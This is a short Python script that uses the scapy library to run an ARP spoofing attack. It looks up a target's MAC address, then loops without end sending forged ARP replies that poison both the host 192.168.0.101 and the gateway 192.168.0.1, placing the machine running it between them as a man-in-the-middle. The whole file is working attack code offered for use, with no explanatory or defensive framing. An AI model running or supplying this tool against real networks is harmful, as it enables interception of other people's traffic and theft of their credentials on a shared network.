import scapy.all as scapy
import sys
import time


def scanner(ip):


    arp_request=scapy.ARP(pdst=ip)

    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")


    arp_request_broadacat=broadcast/arp_request


    answered_list=scapy.srp(arp_request_broadacat,timeout=2,verbose=False)[0]

    return answered_list[0][1].hwsrc



def spoofer(target_ip,gateway_ip):

    get_mac=scanner(target_ip)


    packet=scapy.ARP(op=2,pdst=target_ip,hdst=get_mac,psrc=gateway_ip)

    scapy.send(packet,verbose=False)


packet_count=0


try:


    while True:
        
        spoofer("192.168.0.101","192.168.0.1")
        spoofer("192.168.0.1","192.168.0.101")
        packet_count=packet_count +2
        print("\r[+] packet sent:" + str(packet_count)),
        sys.stdout.flush()
except Exception:

    print("[-] the program quitted")